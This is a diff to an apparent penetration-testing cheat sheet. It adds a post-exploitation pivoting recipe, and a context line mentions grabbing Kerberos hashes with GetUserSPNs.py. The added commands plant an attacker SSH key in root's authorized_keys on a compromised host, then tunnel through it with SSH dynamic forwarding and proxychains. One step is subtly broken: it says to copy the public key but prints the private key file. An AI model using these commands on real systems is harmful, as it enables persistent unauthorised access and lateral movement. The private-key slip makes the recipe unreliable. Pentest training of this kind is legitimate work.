@@ -64,3 +64,27 @@ GetUserSPNs.py can be used to grab kerberos hashes after an account has be ident
 # linux
 
 # priv esc
+# post-exploitation
+### pivoting
+SSH as SOCKS5 proxy server
+```
+### ON YOUR MACHINE (10.10.10.1)
+# CREATE A DIRECTORY FOR MANAGING KEYS
+mkdir piv_keys && chmod 700 piv_keys
+# GENERATE NEW SSH KEY
+ssh-keygen -f piv_keys/id_rsa_1
+# COPY PUBLIC KEY CONTENT TO CLIPBOARD
+cat piv_keys/id_rsa_1 | clip.exe # OR JUST CAT AND COPY### ON A COMPROMISED MACHINE (10.10.10.2)
+# ADD YOUR SSH PUBLIC KEY TO authorized_keys
+echo "ssh-rsa AAAA...[REDACTED]..." >> /root/.ssh/authorized_keys### ON YOUR HOST (10.10.10.1)
+# START SSH DYNAMIC PORT FORWARDING
+ssh -D 9999 -f -N root@10.10.10.2 -i piv_keys/id_rsa_1
+------
+### ON YOUR HOST (10.10.10.1)
+# CONFIGURE PROXYCHAINS (/etc/proxychains4.conf)
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5  127.0.0.1 9999
+```
